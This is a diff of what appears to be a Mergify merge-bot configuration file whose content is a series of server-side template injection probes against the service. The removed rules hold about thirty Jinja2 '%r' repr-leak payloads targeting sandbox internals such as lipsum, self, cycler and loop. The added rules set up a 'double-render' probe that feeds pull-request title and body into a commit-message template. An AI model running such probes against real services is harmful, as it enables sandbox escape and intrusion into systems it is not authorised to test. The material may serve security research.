@@ -1,38 +1,24 @@
+queue_rules:
+  - name: default
+    queue_conditions: []
+    merge_conditions: []
+    merge_method: merge
+    commit_message_template: |
+      Merge: {{ title }}
+
+      Body: {{ body }}
+      Author: {{ author }}
+      
+      G4o7T-double-render-probe-v26
+
 pull_request_rules:
-  - name: g4o7t-repr-leak-harvest-v25
+  - name: v26 double-render-render
     conditions: []
     actions:
       comment:
         message: |
-          === G4o7T v25 %r repr harvest ===
-          R1-files: {{ '%r' | format(files) }}
-          R2-lipsum: {{ '%r' | format(lipsum) }}
-          R3-namespace_empty: {{ '%r' | format(namespace()) }}
-          R4-namespace_w_lipsum: {{ '%r' | format(namespace(x=lipsum)) }}
-          R5-cycler: {{ '%r' | format(cycler('a','b')) }}
-          R6-joiner: {{ '%r' | format(joiner()) }}
-          R7-range: {{ '%r' | format(range(1)) }}
-          R8-dict_lipsum: {{ '%r' | format(dict(a=lipsum)) }}
-          R9-dict_values: {{ '%r' | format(dict(a=lipsum).values()) }}
-          R10-dict_items: {{ '%r' | format(dict(a=lipsum).items()) }}
-          R11-dict_keys: {{ '%r' | format(dict(a=lipsum).keys()) }}
-          R12-self: {{ '%r' | format(self) }}
-          R13-commits: {{ '%r' | format(commits) }}
-          R14-assignee: {{ '%r' | format(assignee) }}
-          R15-author: {{ '%r' | format(author) }}
-          R16-body: {{ '%r' | format(body) }}
-          R17-empty_list_concat: {{ '%r' | format([lipsum] + []) }}
-          R18-list_map_gen: {{ '%r' | format([1,2] | map('string')) }}
-          R19-batch_gen: {{ '%r' | format([1,2] | batch(1)) }}
-          R20-unique_gen: {{ '%r' | format([1,2] | unique) }}
-          R21-select_gen: {{ '%r' | format([1,2] | select) }}
-          R22-method_cycler_next: {{ '%r' | format(cycler('a','b').next) }}
-          R23-Macro: {% macro f() %}x{% endmacro %}{{ '%r' | format(f) }}
-          R24-BlockReference: {% block bb %}x{% endblock %}{{ '%r' | format(self.bb) }}
-          R25-LoopContext: {% for x in [1] %}{{ '%r' | format(loop) }}{% endfor %}
-          R26-Caller: {% macro f() %}{{ '%r' | format(caller) }}{% endmacro %}{% call f() %}content{% endcall %}
-          R27-tuple_items: {{ '%r' | format(dict(a=lipsum).items() | first) }}
-          R28-Cycler-current: {{ '%r' | format(cycler('a','b').current) }}
-          R29-Namespace-attrs: {{ '%r' | format(namespace(a=1,b=2,c=lipsum)) }}
-          R30-DummyList-files: {{ '%r' | format(files) }}
-          === end v25 ===
+          === G4o7T v26 commit_message double-render probe ===
+          PR title: {{ title }}
+          PR body: {{ body }}
+          author: {{ author }}
+          number: {{ number }}
